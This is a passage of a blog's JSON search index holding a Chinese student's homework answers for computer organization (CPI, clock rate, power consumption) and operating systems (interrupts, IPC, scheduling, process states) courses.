2.5G \u6761$ $ I_{p3} = {1 \\times 4 \\over 2.2} \\approx 1.82G \u6761$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#152","title":"1.5.2","text":"<p>\u8bbe$ C $\u4e3a\u65f6\u949f\u6570,\u5219\uff1a</p> <p>$ C_{p1} = 10 \\times 3 = 30G $ $ I_{p1} = {30 \\over 1.5} = 20G $</p> <p>$ C_{p2} = 10 \\times 2.5 = 25G $ $ I_{p2} = {25 \\over 1} = 25G $</p> <p>$ C_{p3} = 10 \\times 4 = 40G $ $ I_{p3} = {40 \\over 2.2} \\approx 18.2G $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#153","title":"1.5.3","text":"<p>(1) $ t = \\frac{I \\cdot CPI}{f} $ (2) $ (1-0.3)t = \\frac{I \\cdot (1+0.2)CPI}{f'} $</p> <p>$ \u7531\\frac{(1)}{(2)} \\Rightarrow \\frac{clock rate'}{clock rate} = {(1+0.2) \\over (1-0.3)} = 1.71$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-16","title":"Exercise 1.6","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#161","title":"1.6.1","text":"<p>\u4ee4$ p_i $\u4e3a\u4e00\u6761\u6307\u4ee4\u5360\u603b\u6307\u4ee4\u7684\u6bd4\u4f8b\uff0c\u5219\u5bf9\u4e8e\u5e73\u5747CPI\uff0c\u6709\uff1a $$     \\overline {CPI} = \\sum_{i=1}^nCPI_i \\cdot p_i $$ \u5bf9\u4e8eP1\uff1a$ \\overline {CPI} = 0.1\\times 1 + 0.2\\times 2 + 0.5\\times 3 + 0.2\\times 3 = 2.5 $ \u5bf9\u4e8eP2\uff1a$ \\overline {CPI} = 2 $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#162","title":"1.6.2","text":"<p>\u5bf9\u4e8eP1\uff0c\u65f6\u949f\u6570\uff1a$ C = \\frac{1.0 \\times 10^6}{2.5} = 4\\times 10^5 $ \u5bf9\u4e8eP2\uff0c\u65f6\u949f\u6570\uff1a$ C = \\frac{1.0 \\times 10^6}{2} = 5\\times 10^5 $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-17","title":"Exercise 1.7","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#a","title":"a)","text":"<p>\u8bbe$ T \\(\u4e3a\u65f6\u949f\u5468\u671f\uff0c\\) t \\(\u4e3a\u7a0b\u5e8f\u6267\u884c\u65f6\u95f4\uff0c\\) I $\u4e3a\u6307\u4ee4\u6570\uff0c\u5219\uff1a $$     CPI = \\frac{t}{I \\cdot T} $$ $ \\overline {CPI_A} = \\frac{1.1s}{1.0 \\times 10^9 \\times 1 ns} = 1.1$ $ \\overline {CPI_B} = \\frac{1.5s}{1.2 \\times 10^9 \\times 1 ns} = 1.25$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#b","title":"b)","text":"<p>\u8bbe$ f = \\frac{1}{T} $\uff0c\u5229\u7528\u4e0a\u8ff0\u516c\u5f0f\uff0c\u5f97: $$ \\frac{CPI_A}{CPI_B} = \\frac{I_B \\cdot T_{PB}}{I_A \\cdot T_{PA}}\\     \\Rightarrow \\frac{1.1}{1.25} = \\frac{1.2 f_{PA}}{1.0 f_{PB}}\\     \\Rightarrow \\frac{f_{PA}}{f_{PB}} = 0.733 $$ \u7b54\uff1a\u5904\u7406\u5668A\u7684\u65f6\u949f\u9891\u7387\u4e3a\u5904\u7406\u5668B\u76840.733\u500d</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#c","title":"c)","text":"<p>\u4ecd\u5047\u8bbecpu\u65f6\u949f\u5468\u671f\u4e3a1ns\uff0c$ t_{new} = 6.0 \\times 10^8 \\times 1.1 \\times 1ns = 0.66s $</p> <p>\u5bf9\u4e8eA: $ \u52a0\u901f\u6bd4 = (1.1 - 0.66)/1.1 = 40\\% $ \u5bf9\u4e8eB\uff1a$ \u52a0\u901f\u6bd4 = (1.5 - 0.66)/1.5 = 29.3\\% $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#exercise-18","title":"Exercise 1.8","text":"","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#181","title":"1.8.1","text":"<p>\u8bbeP\u4e3a\u529f\u8017\uff0cC\u4e3a\u8d1f\u8f7d\u7535\u5bb9\uff0cV\u4e3a\u7535\u538b\uff0cf\u4e3a\u5f00\u5173\u9891\u7387\uff0c\u52a8\u6001\u529f\u8017\u516c\u5f0f\uff1a $$     P = C \\cdot U^2 \\cdot f $$ $ C_{Pentium 4} = \\frac{90}{1.25^2 \\times 3.6 \\times 10^6} = 16 \\mu F$ $ C_{Core i5} = \\frac{40}{0.9^2 \\times 3.4 \\times 10^6} \\approx  14.5 \\mu F$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#182","title":"1.8.2","text":"<p>$ \u8bbep1\u4e3a\u9759\u6001\u529f\u8017\u5360\u603b\u529f\u8017\u7684\u6bd4\u4f8b\uff0cp2\u4e3a\u9759\u6001\u529f\u8017\u76f8\u5bf9\u4e8e\u52a8\u6001\u529f\u8017\u7684\u6bd4\u4f8b\u3002 $</p> <p>$ Pentium 4: p1 = 10/100 = 10\\%, p2 = 10/90 = 11.1\\%$ $ Core i5: p1 = 30/70 =  42.9\\%, p2 = 30/40 = 75\\%$</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/12/2019-09-12-%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86-%E7%AC%AC%E4%B8%80%E7%AB%A0%E4%BD%9C%E4%B8%9A/#183","title":"1.8.3","text":"\\[ P_\u603b = P_\u52a8 + P_\u9759  =  C \\cdot U^2 \\cdot f + I \\cdot U$$ $ \u56e0\u4e3aI\u4e0d\u53d8\uff0c\u8bbe\u53d8\u5316\u540e\u7684\u7535\u538b\u4e3aU'\uff0ct = \\frac{U'}{U},\u5219\uff1a $ $$ P_\u603b' = P_\u52a8 \\cdot \\left( \\frac{U'}{U} \\right)^2 + P_\u9759 \\cdot \\left( \\frac{U'}{U} \\right) \\\\ \\Rightarrow P_\u603b' = P_\u52a8 \\cdot t^2 + P_\u9759 \\cdot t \\] <p>\u5bf9\u4e8eP4\uff1a $ 90 = 90t^2 + 10t \\Rightarrow t \\approx  0.946 $ \u5bf9\u4e8ei5: $ 63 = 40t^2 + 30t \\Rightarrow t \\approx  0.935$ \u7b54\uff1a\u5bf9\u4e8eP4\uff0c\u7535\u538b\u964d\u4e3a\u539f\u6765\u7684$ 94.6\\% \\(\uff0c\u5bf9\u4e8ei5\uff0c\u7535\u538b\u964d\u4e3a\u539f\u6765\u7684\\) 93.5\\% $</p>","tags":["\u7ec4\u6210\u539f\u7406"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e00\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/#13","title":"1.3","text":"<p>Under what circumstances would a user be better off using a timesharing system rather than a PC or single-user workstation? \u7b54\uff1a\u5f53\u8ba1\u7b97\u673a\u6027\u80fd\u8db3\u591f\u5f3a\u5927\u7684\u65f6\u5019\uff0c\u91c7\u7528\u5206\u65f6\u7cfb\u7edf\u53ef\u4ee5\u8ba9\u8ba1\u7b97\u673a\u540c\u65f6\u5730\uff0c\u5feb\u901f\u5730\uff0c\u4e3a\u8bb8\u591a\u7528\u6237\u89e3\u51b3\u590d\u6742\u7684\u95ee\u9898\uff0c\u5e76\u4f7f\u5f97\u8ba1\u7b97\u8d44\u6e90\u5f97\u5230\u5145\u5206\u7684\u5229\u7528\u3002\u6b64\u65f6\u82e5\u8ba9\u6bcf\u4e2a\u7528\u6237\u4f7f\u7528pc\u673a\u53bb\u89e3\u51b3\u95ee\u9898\u4f1a\u9700\u8981\u5f88\u4e45\uff0c\u800c\u7ed9\u4f7f\u7528\u5de5\u4f5c\u7ad9\u6210\u672c\u53c8\u592a\u9ad8\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/#15","title":"1.5","text":"<p>Describe the differences between symmetric and asymmetric multiprocessing. What are three advantages and one disadvantage of multiprocessor systems? \u7b54\uff1a 1. \u533a\u522b\uff1a     - \u5bf9\u79f0\u591a\u5904\u7406\u5668\u4e2d\u7684\u6bcf\u4e2a\u6838\u5bf9\u4e8e\u7a0b\u5e8f\u6765\u8bb2\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u800c\u975e\u5bf9\u79f0\u591a\u5904\u7406\u7684\u6bcf\u4e2a\u6838\u90fd\u6709\u81ea\u5df1\u64c5\u957f\u5904\u7406\u7684\u7279\u5b9a\u7684\u8ba1\u7b97\u4efb\u52a1\uff0c\u662f\u4e0d\u540c\u7684\u3002     - \u5bf9\u79f0\u591a\u5904\u7406\u5668\u4e2d\u7684\u6bcf\u4e2a\u6838\u90fd\u53ef\u4ee5\u8fdb\u884cI/O\u64cd\u4f5c\uff0c\u800c\u975e\u5806\u6210\u4e2d\u591a\u5904\u7406\u4e2d\uff0c\u6709\u4e00\u4e2a\u4e3b\u6838\u63a7\u5236\u5176\u5b83\u4ece\u6838\uff0c\u901a\u5e38\u53ea\u6709\u4e3b\u6838\u6267\u884cI/O\u64cd\u4f5c\u3002</p> <ol> <li>\u4f18\u7f3a\u70b9\uff1a<ul> <li>\u4f18\u70b9\uff1a<ol> <li>\u5229\u7528\u4e86\u5e76\u884c\u6027\uff0c\u589e\u52a0\u4e86\u7cfb\u7edf\u7684\u541e\u5410\u91cf\u3002</li> <li>\u56e0\u4e3a\u4e0d\u540ccpu\u5171\u4eab\u5916\u8bbe\uff0c\u5927\u5bb9\u91cf\u5b58\u50a8\u548c\u7535\u6e90\u7b49\u8d44\u6e90\uff0c\u56e0\u6b64\u66f4\u52a0\u7ecf\u6d4e\u3002</li> <li>\u56e0\u4e3a\u5373\u4f7f\u4e00\u4e2acpu\u51fa\u4e86\u95ee\u9898\uff0c\u6574\u4e2a\u7cfb\u7edf\u4ecd\u53ef\u4ee5\u6b63\u5e38\u5de5\u4f5c\uff0c\u56e0\u6b64\u66f4\u52a0\u53ef\u9760\u3002</li> </ol> </li> <li>\u7f3a\u70b9\uff1a<ol> <li>\u9700\u8981\u7f16\u7a0b\u4eba\u5458\u7f16\u5199\u5e76\u884c\u6027\u7684\u7a0b\u5e8f\u624d\u80fd\u53d1\u6325\u6548\u679c\uff0c\u589e\u52a0\u7f16\u7a0b\u5de5\u4f5c\u91cf\u3002</li> </ol> </li> </ul> </li> </ol>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter1-%E4%BD%9C%E4%B8%9A/#110","title":"1.10","text":"<p>What is the purpose of interrupts? What are the differences between a trap and an interrupt? Can traps be generated intentionally by a user program? If so, for what purpose? \u7b54\uff1a 1. \u4e2d\u65ad\u7684\u76ee\u7684\uff1a     - \u4f7f\u7528\u4e2d\u65ad\u8bbf\u95eeI/O\u673a\u5236\uff0c\u53ef\u4ee5\u6d88\u9664cpu\u5bf9I/O\u8bbe\u5907\u7684\u8f6e\u8be2\uff0c\u51cf\u5c11cpu\u7684\u7b49\u5f85\u65f6\u95f4\u3002     - \u901a\u8fc7\u4e2d\u65ad\u66f4\u5bb9\u6613\u5bf9\u5916\u8bbe\u8fdb\u884c\u54cd\u5e94\uff0c\u5982\u6309\u4e0b\u952e\u76d8\u4f1a\u4ea7\u751f\u4e00\u4e2a\u4e2d\u65ad\uff0c\u8ba1\u7b97\u673a\u5904\u7406\u8fd9\u4e2a\u4e2d\u65ad\u4fbf\u4f1a\u8df3\u8f6c\u5230\u54cd\u5e94\u5904\u7406\u7a0b\u5e8f\u3002 2. \u4e2d\u65ad\u662f\u786c\u4ef6\u4ea7\u751f\u7684\uff0c\u9677\u9631\uff08trap\uff09\u662f\u8f6f\u4ef6\u4ea7\u751f\u7684\u3002 3. \u53ef\u4ee5\uff0c\u5982\u8f6f\u4ef6\u9700\u8981\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u65f6\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e8c\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/#22","title":"2.2","text":"<p>List five services provided by an operating system that are designed to make it more convenient for users to use the computer system. In what cases it would be impossible for user-level programs to provide these services? Explain.</p> <p>1 \u7a0b\u5e8f\u6267\u884c \u670d\u52a1\uff1a\u64cd\u4f5c\u7cfb\u7edf\u5c06\u7a0b\u5e8f\u88c5\u8f7d\u5165\u5185\u5b58\u5e76\u6267\u884c\u7a0b\u5e8f\u3002 \u82e5\u4f7f\u7528\u7528\u6237\u7a0b\u5e8f\u63d0\u4f9b\u8be5\u670d\u52a1\uff0c\u5219\u5f88\u6709\u53ef\u80fd\u5e26\u6765\u5b89\u5168\u9690\u60a3\uff0c\u56e0\u4e3a\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u88c5\u8f7d\u975e\u6cd5\u7a0b\u5e8f\u3002</p> <p>2 I/O\u64cd\u4f5c \u670d\u52a1\uff1a\u7cfb\u7edf\u63d0\u4f9b\u65b9\u4fbf\u64cd\u4f5cI/O\u8bbe\u5907\u7684\u65b9\u6cd5\u3002 \u82e5\u4f7f\u7528\u7528\u6237\u7a0b\u5e8f\u63d0\u4f9b\u8be5\u670d\u52a1\uff0c\u5728\u591a\u7528\u6237\u7cfb\u7edf\u4e2d\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u7a83\u53d6\u5176\u5b83\u7528\u6237\u5b58\u50a8\u5728\u786c\u76d8\u91cc\u7684\u6570\u636e\u3002</p> <p>3 \u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c \u670d\u52a1\uff1a\u63d0\u4f9b\u6587\u4ef6\u7684\uff0c\u521b\u5efa\u3001\u5220\u9664\u3001\u641c\u7d22\u3001\u83b7\u53d6\u4fe1\u606f\u65b9\u6cd5\uff0c\u5e76\u63d0\u4f9b\u8bbf\u95ee\u6743\u9650\u7ba1\u7406\u3002 \u540c\u6837\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u975e\u6cd5\u8bbf\u95ee\u6587\u4ef6\u3002</p> <p>4 \u901a\u4fe1 \u670d\u52a1\uff1a\u63d0\u4f9b\u8fdb\u7a0b\u95f4\u7684\u76f8\u4e92\u901a\u4fe1\u3002\uff08\u540c\u4e00\u8ba1\u7b97\u673a\u5185\u7684\u4e0d\u540c\u8fdb\u7a0b\u6216\u901a\u8fc7\u7f51\u7edc\u94fe\u63a5\u7684\u4e0d\u540c\u8ba1\u7b97\u673a\u7684\u8fdb\u7a0b\uff09 \u540c\u6837\uff0c\u5e94\u7528\u7a0b\u5e8f\u53ef\u80fd\u4f1a\u975e\u6cd5\u7a83\u542c\u5176\u5b83\u5e94\u7528\u7684\u4fe1\u606f\u3002</p> <p>5 \u9519\u8bef\u68c0\u6d4b \u670d\u52a1\uff1a\u5bf9\u4e8e\u53d1\u751f\u5728\u786c\u4ef6\u4e0a\u6216\u7528\u6237\u7a0b\u5e8f\u4e2d\u7684\u9519\u8bef\uff0c\u64cd\u4f5c\u7cfb\u7edf\u91c7\u53d6\u9002\u5f53\u7684\u5904\u7406\u63aa\u65bd\u3002 \u82e5\u4f7f\u7528\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u8be5\u670d\u52a1\uff0c\u5219\u5e94\u7528\u7a0b\u5e8f\u5728\u7f16\u5199\u65f6\u9700\u8981\u8003\u8651\u6240\u6709\u53ef\u80fd\u7684\u9519\u8bef\uff0c\u8fd9\u662f\u4e0d\u73b0\u5b9e\u7684\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/#25","title":"2.5","text":"<p>What are the five major activities of an operating system in regard to file management?</p> <ul> <li>\u6587\u4ef6\u7684\u521b\u5efa\u548c\u5220\u9664</li> <li>\u6587\u4ef6\u7684\u6253\u5f00\u548c\u5173\u95ed</li> <li>\u6587\u4ef6\u7684\u8bfb\u3001\u5199\u3001\u91cd\u5b9a\u4f4d</li> <li>\u8bfb\u53d6\u6587\u4ef6\u5c5e\u6027\u548c\u8bbe\u7f6e\u6587\u4ef6\u5c5e\u6027</li> <li>\u6587\u4ef6\u7684\u6743\u9650\u7ba1\u7406</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/17/2019-09-17-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter2-%E4%BD%9C%E4%B8%9A.md/#28","title":"2.8","text":"<p>What are the two models of interprocess communication? What are the strengths and weaknesses of the two approaches?</p> <p>1 \u5171\u4eab\u5185\u5b58(shared-memory model) \u4f18\u70b9\uff1a - \u901f\u5ea6\u5feb - \u8bbf\u95ee\u6570\u636e\u65b9\u4fbf</p> <p>\u7f3a\u70b9\uff1a - \u4e0d\u6613\u8fdb\u884c\u6570\u636e\u7684\u4fdd\u62a4\u548c\u540c\u6b65</p> <p>2 \u6d88\u606f(message-passing model) \u4f18\u70b9\uff1a - \u4e0d\u5fc5\u907f\u514d\u51b2\u7a81 - \u8ba1\u7b97\u673a\u95f4\u901a\u4fe1\u65f6\uff0c\u66f4\u5bb9\u6613\u5b9e\u73b0</p> <p>\u7f3a\u70b9\uff1a - \u5927\u91cf\u6570\u636e\u4f20\u8f93\u65f6\uff0c\u901f\u5ea6\u6162</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/","title":"\u64cd\u4f5c\u7cfb\u7edf\u7b2c\u4e09\u7ae0 \u4f5c\u4e1a","text":"","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#31","title":"3.1","text":"<p>Describe the differences among short-term, medium-term, and long-term scheduling.</p> <ul> <li>\u77ed\u671f\u8c03\u5ea6 \u4ece\u5185\u5b58\u4e2d\u7684\u5c31\u7eea\u961f\u5217\u91cc\u9009\u62e9\u4e00\u4e2a\u8fdb\u7a0b\u6267\u884c\u3002\u6267\u884c\u6700\u4e3a\u9891\u7e41\uff0c\u4e3a\u4fdd\u8bc1\u6267\u884c\u65f6\u95f4\u77ed\uff0c\u56e0\u800c\u8c03\u5ea6\u7b97\u6cd5\u4e0d\u80fd\u592a\u590d\u6742\u3002</li> <li>\u957f\u671f\u8c03\u5ea6 \u4e5f\u79f0\u4e3a\u5de5\u4f5c\u8c03\u5ea6\uff0c\u51b3\u5b9a\u4ece\u78c1\u76d8\u4e2d\u5c06\u54ea\u4e9b\u8fdb\u7a0b\u653e\u5165\u5185\u5b58\u3002\u56e0\u4e3a\u6267\u884c\u5f88\u4e0d\u9891\u7e41\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u66f4\u590d\u6742\u7684\u8c03\u5ea6\u7b97\u6cd5\uff0c\u4ece\u800c\u4f7f\u5185\u5b58\u4e2d\u8fdb\u7a0b\u7684CPU\u4f7f\u7528\u548cI/O\u4f7f\u7528\u66f4\u5747\u8861\uff0c\u8d44\u6e90\u5229\u7528\u7387\u66f4\u9ad8\u3002</li> <li>\u4e2d\u671f\u8c03\u5ea6 \u6709\u4ea4\u6362\u7684\u673a\u5236\uff0c\u5373\u5c06\u8fdb\u7a0b\u4ece\u5185\u5b58\u4e2d\u79fb\u9664\uff0c\u5e76\u5728\u9002\u5f53\u65f6\u95f4\u518d\u6b21\u5c06\u5176\u8c03\u5165\u5185\u5b58\u3002\u8fd9\u6709\u52a9\u4e8e\u52a8\u6001\u6539\u5584\u8fdb\u7a0b\u7ec4\u5408\uff0c\u4f7fCPU\u548cI/O\u4f7f\u7528\u66f4\u5747\u8861\u3002</li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#32","title":"3.2","text":"<p>Describe the actions taken by a kernel to context-switch between processes.</p> <p>\u8fdb\u7a0b\u95f4\u7684\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u5373\u5207\u6362\u5230\u53e6\u4e00\u4e2a\u8fdb\u7a0b\u65f6\u9700\u8981\u4fdd\u7559\u5f53\u524d\u8fdb\u7a0b\u7684\u72b6\u6001\u5e76\u6062\u590d\u53e6\u4e00\u8fdb\u7a0b\u7684\u72b6\u6001\u3002\u8fd9\u4e9b\u72b6\u6001\u53ef\u4ee5\u7528PCB\u5373\u8fdb\u7a0b\u63a7\u5236\u5757\u8868\u793a\uff0c\u5305\u542b\u8fdb\u7a0b\u72b6\u6001\uff0c\u7a0b\u5e8f\u8ba1\u6570\u5668\uff0cCPU\u5bc4\u5b58\u5668\u7b49\u4fe1\u606f\u3002\u4e0a\u4e0b\u6587\u5207\u6362\u65f6\uff0c\u4e3b\u8981\u6267\u884c\u4e00\u4e2a\u72b6\u6001\u4fdd\u5b58\u548c\u72b6\u6001\u6062\u590d\u8fc7\u7a0b\uff0c\u53ef\u80fd\u8fd8\u8981\u6267\u884c\u4e00\u4e9b\u4f53\u7cfb\u7ed3\u6784\u6709\u5173\u7684\u64cd\u4f5c\u6bd4\u5982\u6e05\u9664cache\u7b49\u3002</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3a","title":"3.A","text":"<p>Consider a computer with N processors in a multiprocessor configuration.</p> <p>a. How many processes can be in each of the Ready, Running, and Waiting states at one time? \u7b54\uff1a\u82e5\u5e72\u4e2a\u5c31\u7eea\u9636\u6bb5\uff0c\u4e0d\u8d85\u8fc7N\u4e2a\u6267\u884c\u9636\u6bb5\uff0c\u82e5\u5e72\u4e2a\u7b49\u5f85\u9636\u6bb5\u3002 b. What is the minimum number of processes that can be in each of the Ready, Running, and Waiting states at one time? \u7b54\uff1a\u6700\u5c11\u5f53\u7136\u90fd\u662f0\u4e2a\uff1f</p>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3b","title":"3.B","text":"<p>Please explain the five states of a process.</p> <ul> <li> <p>new: \u8fdb\u7a0b\u521a\u88ab\u521b\u5efa\u65f6\uff0c\u5904\u4e8e\u6b64\u9636\u6bb5\u3002\u5982linux\u4e2dfork\u7cfb\u7edf\u8c03\u7528\u521b\u5efa\u65b0\u8fdb\u7a0b\u65f6\u3002</p> </li> <li> <p>ready: \u8fdb\u7a0b\u6267\u884c\u7b49\u5f85\u88ab\u5206\u914d\u5230CPU\u4e2d\u6267\u884c\u3002</p> </li> <li> <p>run: \u8fdb\u7a0b\u6b63\u5728\u88ab\u6267\u884c\u3002</p> </li> <li> <p>waiting: \u8fdb\u7a0b\u7531\u4e8e\u9700\u8981\u7b49\u5f85I/O\u7b49\u8bbe\u5907\u7684\u6570\u636e\uff0c\u800c\u4e0d\u80fd\u6267\u884c\uff0c\u88ab\u653e\u7f6e\u5bf9\u5e94\u8bbe\u5907\u7684\u7b49\u5f85\u961f\u5217\u4e2d\u3002</p> </li> <li> <p>terminated: \u8fdb\u7a0b\u6267\u884c\u7ed3\u675f\uff0c\u6b63\u5728\u91ca\u653e\u8fdb\u7a0b\u7684PCB\u3002</p> </li> </ul>","tags":["\u64cd\u4f5c\u7cfb\u7edf"]},{"location":"%E8%AF%BE%E7%A8%8B/2019/09/23/2019-09-23-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%A6%82%E5%BF%B5-chapter3-%E4%BD%9C%E4%B8%9A/#3c","title":"3.C","text":"<p>what is the role of PCB in OS? What information is contained in PCB? 